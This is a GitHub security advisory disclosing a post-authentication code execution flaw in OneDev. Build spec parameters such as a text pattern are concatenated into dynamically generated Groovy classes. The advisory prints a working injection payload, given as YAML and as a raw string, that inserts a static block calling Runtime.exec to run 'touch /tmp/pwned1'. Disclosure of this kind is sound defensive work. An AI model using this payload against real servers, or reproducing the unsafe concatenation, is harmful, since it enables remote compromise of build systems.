# Post-Auth Arbitrary Code execution via Groovy script injection

High

[robinshine](/robinshine)
published
GHSA-gwp4-5498-hv5f
Jan 11, 2021

## Package

## Description

### Impact

[`InputSpec`](https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/model/support/inputspec/InputSpec.java) is used to define parameters of a Build spec.

It does so by using [dynamically generated Groovy classes](https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/model/support/inputspec/InputSpec.java#L209). A user able to control job parameters can run arbitrary code on OneDev's server by injecting arbitrary Groovy code.

For example, for text parameters the class [TextInput](https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/model/support/inputspec/textinput/TextInput.java) is used, which dynamically builds fields and method annotations:

```
buffer.append("    @Pattern(regexp=\"" + pattern + "\", message=\"Should match regular expression: " + pattern + "\")\n");
```

Where `pattern` can be controlled by the user as part of the build spec. For example, to execute arbitrary Groovy code, you can define the following pattern:

```
  paramSpecs:
  - !TextParam
    name: test
    description: test
    allowEmpty: false
    pattern: foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch
      /tmp/pwned1");} //

```

The payload used is:

```
foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch /tmp/pwned1");} //

```

Which, when injected, will result in:

```
...
@Pattern(regexp="foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch /tmp/pwned1");} // ", message="Should match regular expression: " foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch /tmp/pwned1");} // ")\n");
public String input1() {
  ...
}
```

When we remove the commented out text and sort it, we get:

```
@Pattern(regexp="foo")
public String foo() {return "";};
static {Runtime.getRuntime().exec("touch /tmp/pwned1");}
public String input1() {
  ...
}

```

Resulting in the injection of a static constructor that will run our arbitrary code. Injection is not only possible in text patterns, but in many other parameters.

This issue may lead to `post-auth RCE`
